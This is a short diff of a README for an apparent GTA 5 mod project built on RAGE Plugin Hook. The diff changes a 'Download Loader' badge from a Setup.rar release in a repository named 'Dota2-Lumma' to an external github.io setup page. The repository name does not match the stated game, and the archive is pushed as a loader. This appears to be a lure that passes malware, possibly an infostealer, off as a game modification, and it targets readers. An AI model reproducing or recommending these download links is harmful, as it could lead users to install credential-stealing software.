@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for RAGE Plugin Hook
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `RAGE-Plugin-Hook` · Updated: 2026-11-03
 
 **Tags:** `gta-5` `lspdfr` `rage-engine`
+
 
 
